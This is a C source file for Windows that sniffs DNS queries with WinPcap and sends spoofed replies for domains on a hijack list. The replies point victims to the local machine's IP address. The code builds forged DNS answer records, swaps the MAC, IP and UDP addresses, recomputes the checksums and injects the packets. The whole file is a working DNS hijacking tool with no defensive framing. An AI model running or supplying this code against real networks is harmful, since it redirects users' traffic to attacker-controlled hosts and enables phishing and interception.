

#include <WINSOCK2.H>
#include <windows.h>
#include "Public.h"
#include "Packet.h"
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"





WORD CalcChecksum(WORD *buffer,int size)
{
	unsigned long cksum = 0;
	while(1<size)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if(0<size)
		cksum += *(UCHAR*)buffer;
	cksum = (cksum>>16) + (cksum&0xffff);
	cksum += (cksum>>16);
	return(unsigned short)(~cksum);
}



USHORT GetUdpCheckSum(LPUDPHEADER pUdp,DWORD dwSrcIP,DWORD dwDstIP)
{
	char szCheckSumBuf[DNS_PACKET_LIMIT] = {0};
	LPUDPFAKEHEADER pUdpFake = (LPUDPFAKEHEADER)szCheckSumBuf;
	pUdpFake->dwSrcIP = dwSrcIP;
	pUdpFake->dwDstIP = dwDstIP;
	pUdpFake->Protocol = ntohs(IPPROTO_UDP);
	pUdpFake->UdpLen = pUdp->PacketSize;

	int iUdpSize = ntohs(pUdp->PacketSize);
	memmove(szCheckSumBuf + sizeof(UDPFAKEHEADER),(char*)pUdp,iUdpSize);

	unsigned short nCheckSum = CalcChecksum((WORD*)szCheckSumBuf,iUdpSize + sizeof(UDPFAKEHEADER));
	return nCheckSum;
}



int IsInDnsHijack(char *szDomainName)
{
	for (DWORD i = 0; i < gHijackDnsNameCnt; i ++)
	{
		if (strstr(szDomainName,gHijackDnsName[i]))
		{
			return TRUE;
		}
	}

	return FALSE;
}



int __stdcall DnsSnifferHijack(pcap_t * pcapT)
{
	pcap_pkthdr *		pHeader = 0;
	const unsigned char * pData	= 0;

	DNSANSWER			stDnsAnswer = {0};
	stDnsAnswer.Name		= htons(0xc00c);
	stDnsAnswer.Type		= htons(0x0001);
	stDnsAnswer.Class		= htons(0x0001);
	stDnsAnswer.HighTTL		= htons(0x0000);
	stDnsAnswer.LowTTL		= htons(0x0080);
	stDnsAnswer.AddrLen		= htons(0x0004);
	stDnsAnswer.Address		= gLocalIPAddr;

	while (TRUE)
	{
		int iRet = pcap_next_ex(pcapT,&pHeader,&pData);
		if (iRet <= 0)
		{
			continue;
		}

		if (pHeader->caplen >= MAX_PACKET_SIZE || pHeader->len >= MAX_PACKET_SIZE || pHeader->len != pHeader->caplen || pHeader->caplen <= 0)
		{
			continue;
		}
		int iCapLen = pHeader->caplen;
		*((char*)pData + iCapLen) = 0;

		LPMACHEADER pMac = (LPMACHEADER)pData;
		if (pMac->Protocol != 0x0008)
		{
			continue;
		}

		LPIPHEADER pIPHdr = (LPIPHEADER)(pData + sizeof(MACHEADER) );
		if (pIPHdr->Version != 4)
		{
			continue;
		}

		int iIpHdrLen = pIPHdr->HeaderSize << 2;
		int iIpLen = ntohs(pIPHdr->PacketSize);
		//if ( iIpLen != iCapLen - sizeof(MACHEADER) )
		//{
		//	continue;
		//}

		if (pIPHdr->Protocol == IPPROTO_UDP )
		{
			LPUDPHEADER pUDPHdr  = (LPUDPHEADER)(pData + sizeof(MACHEADER) + iIpHdrLen);

			USHORT usSport = ntohs(pUDPHdr->SrcPort);
			USHORT usDport = ntohs(pUDPHdr->DstPort);
			USHORT usUdpSize = ntohs(pUDPHdr->PacketSize);
			if (usUdpSize != iIpLen - iIpHdrLen)
			{
				//continue;
			}

			if (usDport != DNS_PORT /*&& usSport != DNS_PORT*/)
			{
				continue;
			}

			int iDnsPackLen = usUdpSize - sizeof(UDPHEADER);
			if (iDnsPackLen <= sizeof(DNSHEADER)  || iDnsPackLen  >= DNS_PACKET_LIMIT || usDport != DNS_PORT)
			{
				continue;
			}

			LPDNSHEADER pDnsHdr = (LPDNSHEADER)(pData + sizeof(MACHEADER)+ iIpHdrLen + sizeof(UDPHEADER));

			char * pName =  (char*)((int)pDnsHdr + sizeof(DNSHEADER));
			char szDomainName[DNS_PACKET_LIMIT] = {0};
			char * pDomain = szDomainName;
			int iDomainLen = 0;


			while(TRUE) 
			{
				int iNameLen = *pName;
				if(iNameLen == 0 && iDomainLen > 0 && *(pDomain - 1) == '.')
				{
					*(pDomain - 1) = 0;
					break;
				}else if (iNameLen > 0 && iNameLen <= MAX_DNS_DOMAIN_NAME_SPLIT_SIZE )
				{
					pName ++;
					for (int i = 0; i < iNameLen;i ++)
					{
						*(pDomain + i) = *(pName + i);
					}
					//memmove(pDomain,pName,iNameLen);
					pName += iNameLen;
					pDomain += iNameLen;
					*pDomain = '.';
					//lstrcatA(pDomain,".");
					pDomain ++;
					//iNameLen = *pName;
					iDomainLen = iDomainLen + iNameLen + 1;
				}
				else{
					char szlog[1024];
					wsprintfA(szlog,"domain size longer than%d\r\n",MAX_DNS_DOMAIN_NAME_SPLIT_SIZE);
					WriteLogFile(szlog);
					break;
					//continue;
				}
			}


			iRet = IsInDnsHijack(szDomainName);
			if (iRet)
			{
				int iSize = sizeof(DNSANSWER);

				pDnsHdr->Flags			= 0x8081;		
				pDnsHdr->Questions		= 0x0100;
				pDnsHdr->AnswerRRS		= 0x0100;
				pDnsHdr->AuthorityRRS	= 0x0000;
				pDnsHdr->AdditionalRRS	= 0x0000;
				memmove((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char *)&stDnsAnswer,iSize);	

				unsigned short  TmpPort	= pUDPHdr->SrcPort;
				pUDPHdr->SrcPort		= pUDPHdr->DstPort;
				pUDPHdr->DstPort		= TmpPort;
				pUDPHdr->PacketSize		= htons(ntohs(pUDPHdr->PacketSize) + iSize);
				pUDPHdr->PacketChksum	= 0;

#ifdef _DEBUG
				//WriteLogFile("log.dat",(char*)pUDPHdr,usUdpSize);
#endif
				pUDPHdr->PacketChksum	= GetUdpCheckSum(pUDPHdr,pIPHdr->SrcIP,pIPHdr->DstIP);

				pIPHdr->DF				= 0;
				pIPHdr->Unnamed			= 0;
				pIPHdr->FragmentOffset	= 0;
				pIPHdr->MF				= 0;
				pIPHdr->PacketSize		= htons(ntohs(pIPHdr->PacketSize) + iSize);
				pIPHdr->PacketID		= 0;
				pIPHdr->TimeToLive		= 0x80;	
				pIPHdr->HeaderChksum	= 0;
				unsigned int TmpIP		= pIPHdr->SrcIP;
				pIPHdr->SrcIP			= pIPHdr->DstIP;
				pIPHdr->DstIP			= TmpIP;
				pIPHdr->HeaderChksum	= CalcChecksum((unsigned short*)pIPHdr,(unsigned int)sizeof(IPHEADER));

				char pTmpMac[MAC_ADDRESS_SIZE];
				memmove(pTmpMac,pMac->DstMAC,MAC_ADDRESS_SIZE);
				memmove(pMac->DstMAC,pMac->SrcMAC,MAC_ADDRESS_SIZE);
				memmove(pMac->SrcMAC,pTmpMac,MAC_ADDRESS_SIZE);

				iRet = pcap_sendpacket(pcapT,pData,iCapLen + iSize);

				SYSTEMTIME sttime = {0};
				GetLocalTime(&sttime);
				char strtime[1024] = {0};
				int ret = wsprintfA(strtime,"%u-%u-%u %u:%u:%u",sttime.wYear,sttime.wMonth,sttime.wDay,sttime.wHour,sttime.wMinute,sttime.wSecond);
				if (iRet == 0)
				{
					char szShowInfo[1024];
					wsprintfA(szShowInfo,"%s process dns requirement:%s ok\r\n",strtime,szDomainName);
					printf(szShowInfo);
				}
				else
				{
					char szShowInfo[1024];
					wsprintfA(szShowInfo,"%s process dns requirement:%s error\r\n",strtime,szDomainName);
					printf(szShowInfo);
				}
			}
			
		}
	}
	return TRUE;
}